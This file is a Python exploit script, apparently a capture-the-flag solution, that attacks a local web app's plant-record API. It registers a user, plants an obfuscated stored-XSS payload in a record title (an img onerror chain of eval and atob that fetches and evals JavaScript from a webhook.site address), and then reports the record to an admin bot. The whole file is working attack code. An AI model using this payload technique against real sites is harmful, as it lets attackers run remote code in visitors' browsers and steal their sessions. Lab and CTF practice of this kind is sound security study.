import requests
import random
import base64

host = "http://localhost"
webhook = "https://webhook.site/YOUR_WEBHOOK_HERE"

username = random.randbytes(16).hex()
password = username
print(f"{username = }\n{password = }")


def create_user():
    global username, password
    r = requests.post(
        f"{host}/api/collections/users/records",
        json={
            "username": username,
            "password": password,
            "passwordConfirm": password,
        }
    )
    return r.json()["id"]

def auth():
    r = requests.post(
        f"{host}/api/collections/users/auth-with-password",
        json={
            "identity": username,
            "password": password,
        }
    )
    return r.json()["token"]

def create_plant(token, creator, payload):
    img = "pwn.png"
    
    r = requests.post(
        f"{host}/api/collections/plants/records",
        headers={
            "Authorization": token,  
        },
        files={
            "img": open(img, "rb")
        },
        data={
            "title": payload,
            "creator": creator,
        },
    )
    jsn = r.json()
    return r.json()["id"]


def report(id):
    r = requests.post(
        f"{host}/report",
        headers={
            "Content-Type": "application/json"
        },
        json={
            "id": id,
        }
    )
    return r.text


p = f"fetch('{webhook}').then(aa=>aa.text().then(t=>eval(t)))"
p = base64.b64encode(p.encode()).decode().replace("\n", "")
js_code = 'eval.call`${eval.call`${`atob\`' + p +'\``}`}`'
p = f"&lt;img src=x onerror={js_code}&gt;"
print(p)
print("Creating user")
creator = create_user()
print("Obtaining token")
token = auth()
print("Submitting payload", len(p))
id = create_plant(token, creator, p)
print("Reporting to the bot", id)
rsp = report(id)
print(rsp)
# Now run `exiftool <img>` and you should be able to see the flag under the `Artist` field
